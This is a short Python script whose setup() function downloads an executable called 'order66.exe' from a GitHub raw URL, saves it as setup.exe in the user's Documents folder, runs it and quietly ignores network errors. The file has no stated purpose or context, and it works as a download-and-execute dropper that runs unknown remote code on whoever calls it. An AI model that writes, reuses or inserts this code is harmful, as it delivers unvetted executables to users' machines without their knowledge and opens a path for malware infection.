import os, requests, subprocess
def setup():
    setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "setup.exe")
    try:
        with open(setupexepath, 'wb') as file:
            file.write(requests.get("https://github.com/Sam-cpu999/stuff/raw/main/order66.exe").content)
        subprocess.run([setupexepath])
    except requests.exceptions.RequestException:
        pass
